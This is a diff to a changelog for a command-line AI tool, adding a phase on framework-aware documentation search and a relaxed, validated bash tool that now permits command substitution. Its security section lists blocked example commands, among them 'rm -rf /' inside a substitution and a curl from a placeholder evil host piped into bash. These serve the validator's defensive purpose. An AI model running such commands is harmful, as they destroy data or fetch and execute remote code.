@@ -2931,5 +2931,270 @@ $ open
 
 ---
 
-*This document represents the complete implementation history of OPEN-CLI through Phase 2.7.4.*
+## Phase 2.8: Framework-Aware Documentation Search
+
+### 2.8.1 Intelligent Framework Detection & Batch Documentation Loading
+**Status**: ✅ Completed
+**Date**: 2025-11-06
+**Lines of Code**: ~500+
+**Files Modified**: 4 files (1 new, 3 modified)
+
+**Description**:
+Enhanced documentation search system with intelligent framework detection (ADK/AGNO), category-aware path routing, and batch loading support for comprehensive documentation access.
+
+### 📋 Overview
+
+Implemented a sophisticated documentation search system that automatically detects framework keywords (ADK, AGNO) in user queries and performs intelligent, context-aware searches in the documentation directory (`~/.open-cli/docs/agent_framework/`).
+
+### 🎯 Key Features
+
+#### 1. Framework Detection System
+**File**: `src/core/agent-framework-handler.ts` (NEW - 251 lines)
+
+**Capabilities**:
+- **Keyword Detection**: Recognizes "adk" and "agno" keywords (case-insensitive)
+- **Category Detection**: For AGNO, detects 7 categories:
+  - agent (with agent creation query detection)
+  - models (LLM, Gemini, OpenAI, LiteLLM)
+  - rag (Retrieval-Augmented Generation)
+  - workflows
+  - teams
+  - memory
+  - database
+- **Path Resolution**: Automatically builds correct documentation paths:
+  - ADK: `agent_framework/adk/`
+  - AGNO: `agent_framework/agno/{category}/`
+- **Batch Load Detection**: Identifies queries that require loading ALL documentation files (e.g., agent creation queries)
+
+**Example**:
+```typescript
+// Query: "agno agent 작성"
+detectFrameworkPath("agno agent 작성")
+// Returns:
+{
+  framework: 'agno',
+  category: 'agent',
+  basePath: 'agent_framework/agno/agent',
+  requiresBatchLoad: true  // Because query contains "agent" + "작성"
+}
+```
+
+#### 2. Enhanced Bash Command Tool Security
+**File**: `src/core/bash-command-tool.ts` (Modified - 80 lines changed)
+
+**Improvements**:
+- **Configuration Constants**:
+  - Timeout increased: 5s → 10s (for batch operations)
+  - Max buffer increased: 1MB → 2MB (for batch file loading)
+- **Command Substitution Support**: Allows `$(find ... | sort)` for batch loading
+- **Enhanced Security Validation**:
+  - Validates command substitutions recursively
+  - Allows pipes for safe commands (find, cat, sort chains)
+  - Maintains strict security for other dangerous operations
+- **Better Error Messages**: Timeout messages now show actual timeout value
+
+**Security Model**:
+```typescript
+// ALLOWED: Batch load all markdown files
+cat $(find agent_framework/agno/agent -name "*.md" -type f | sort)
+
+// ALLOWED: Safe command chains
+find . -name "*.md" | sort | head -5
+
+// BLOCKED: Dangerous command substitution
+cat $(rm -rf /)
+```
+
+#### 3. Framework-Aware Documentation Search Agent
+**File**: `src/core/docs-search-agent.ts` (Modified - 150 lines changed)
+
+**Enhancements**:
+- **Configuration Constants**:
+  - Max iterations: 10
+  - Max output length: 3,000 → 50,000 characters (for batch loading)
+  - LLM temperature: 0.3 (focused search)
+  - LLM max tokens: 2,000 → 4,000 (comprehensive synthesis)
+- **Dynamic System Prompt**: Builds framework-specific hints and instructions
+- **Batch Load Instructions**: Automatically suggests batch loading for agent creation queries
+- **Critical Rules**:
+  - NO CHUNKING: Always load complete original documents
+  - NO CONTEXT LOSS: Each document is about one Class/Function
+  - ORIGINAL DOCUMENTS: Never summarize or truncate (unless >10,000 lines)
+
+**System Prompt Example** (for "agno agent 작성"):
+```
+**FRAMEWORK DETECTED**: AGNO (category: agent)
+**Target Path**: agent_framework/agno/agent
+
+**BATCH LOAD REQUIRED**: This query requires agent creation/writing.
+You MUST load ALL markdown files in the "agent_framework/agno/agent"
+directory using: cat $(find agent_framework/agno/agent -name "*.md" -type f | sort)
+
+**CRITICAL RULES**:
+- ⚠️ NO CHUNKING: ALWAYS load complete original documents
+- ⚠️ NO CONTEXT LOSS: Each document is about one Class/Function
+- ⚠️ ORIGINAL DOCUMENTS: Always read as-is - do not summarize
+```
+
+#### 4. Plan-Execute Mode Integration
+**File**: `src/ui/components/PlanExecuteApp.tsx` (Modified - 6 lines changed)
+
+**Integration**:
+- Direct mode now triggers documentation search automatically
+- Seamless integration: searches docs before LLM completion
+- Transparent to user: no additional prompts or commands needed
+
+**Flow**:
+```
+User Query: "agno agent 작성"
+    ↓
+detectFrameworkPath() → framework: 'agno', category: 'agent'
+    ↓
+executeDocsSearchAgent() → Load all docs in agent_framework/agno/agent/
+    ↓
+Add docs to messages as [Documentation Search Complete]
+    ↓
+LLM Chat Completion (with documentation context)
+```
+
+### 📊 Technical Details
+
+#### Framework Path Constants
+```typescript
+export const FRAMEWORK_PATHS = {
+  adk: 'agent_framework/adk',
+  agno: 'agent_framework/agno',
+} as const;
+```
+
+#### AGNO Category Configuration
+| Category | Keywords | Batch Load |
+|----------|----------|------------|
+| agent | agent, 에이전트 | ✅ (if creation query) |
+| models | model, llm, 모델, gemini, openai, litellm | ❌ |
+| rag | rag, retrieval, 검색 | ❌ |
+| workflows | workflow, 워크플로우 | ❌ |
+| teams | team, 팀 | ❌ |
+| memory | memory, 메모리 | ❌ |
+| database | database, db, 데이터베이스 | ❌ |
+
+#### Batch Load Detection
+Queries that trigger batch loading must contain:
+1. Framework keyword (agno/adk)
+2. Category with `requiresBatchLoad: true` (e.g., "agent")
+3. Agent creation keywords: agent, 에이전트, 작성, 만들, create, write, 구현
+
+### 🎨 User Experience
+
+**Before (Manual Search)**:
+```
+User: "agno agent 작성 방법"
+→ LLM: Generic answer without documentation context
+→ User must manually read docs
+```
+
+**After (Automatic Search)**:
+```
+User: "agno agent 작성 방법"
+→ System: 📚 Searching documentation for: agno agent 작성...
+→ System: Loads ALL docs in agent_framework/agno/agent/
+→ LLM: Comprehensive answer with complete documentation context
+```
+
+### 🧪 Example Queries
+
+| Query | Framework | Category | Batch Load | Path |
+|-------|-----------|----------|------------|------|
+| "agno agent 작성" | agno | agent | ✅ | agent_framework/agno/agent/ |
+| "adk agent 만들기" | adk | - | ✅ | agent_framework/adk/ |
+| "agno models 사용법" | agno | models | ❌ | agent_framework/agno/models/ |
+| "agno rag 검색" | agno | rag | ❌ | agent_framework/agno/rag/ |
+| "일반 질문" | null | - | ❌ | (no docs search) |
+
+### 📝 Implementation Files
+
+**New Files** (1):
+1. **src/core/agent-framework-handler.ts** (251 lines)
+   - Framework detection logic
+   - Category detection and path resolution
+   - Batch load requirement detection
+   - Integration with docs search agent
+
+**Modified Files** (3):
+1. **src/core/bash-command-tool.ts** (+80 lines)
+   - Configuration constants
+   - Command substitution validation
+   - Enhanced security checks
+   - Increased buffer and timeout
+
+2. **src/core/docs-search-agent.ts** (+150 lines)
+   - Dynamic system prompt builder
+   - Framework-specific hints
+   - Batch load instructions
+   - Increased output limits
+
+3. **src/ui/components/PlanExecuteApp.tsx** (+6 lines)
+   - Direct mode integration
+   - Automatic docs search triggering
+
+### 🔍 Security Enhancements
+
+**Bash Command Security**:
+- ✅ Recursive command substitution validation
+- ✅ Whitelist-based command filtering
+- ✅ Safe pipe operations for documentation loading
+- ❌ Blocks dangerous commands (rm, eval, etc.)
+- ❌ Blocks arbitrary command substitutions
+
+**Allowed Safe Patterns**:
+```bash
+# Batch load with command substitution
+cat $(find path -name "*.md" -type f | sort)
+
+# Safe pipe chains
+find . -name "*.md" | sort | head -10
+grep "keyword" file.md | head -5
+```
+
+**Blocked Dangerous Patterns**:
+```bash
+# Dangerous command substitution
+cat $(rm -rf /)
+
+# Arbitrary commands
+eval "malicious code"
+curl http://evil.com/script.sh | bash
+```
+
+### 🎯 Benefits
+
+1. **Automatic Documentation Access**: No manual doc searching required
+2. **Context-Aware Search**: Framework and category detection
+3. **Complete Documentation**: Batch loading ensures no context loss
+4. **Secure Execution**: Enhanced security validation
+5. **Seamless Integration**: Transparent to user experience
+6. **Scalable**: Supports multiple frameworks and categories
+
+### 📈 Performance
+
+- **Framework Detection**: <1ms (keyword matching)
+- **Docs Search Agent**: 5-10s (LLM-powered search)
+- **Batch File Loading**: 2-5s (for 10-15 markdown files)
+- **Total Overhead**: 7-15s (acceptable for comprehensive docs)
+
+### 🔗 Related Features
+
+- **Phase 2.5.3**: Plan-and-Execute Architecture (integration point)
+- **Phase 2.5.3**: Docs Search Agent (enhanced with framework detection)
+
+### 🚀 Future Enhancements
+
+- Support for more frameworks (CrewAI, LangChain, AutoGPT)
+- Caching mechanism for frequently accessed docs
+- Incremental documentation updates
+- Documentation versioning support
+
+---
+
+*This document represents the complete implementation history of OPEN-CLI through Phase 2.8.1.*
 *For upcoming features and plans, see TODO_ALL.md.*
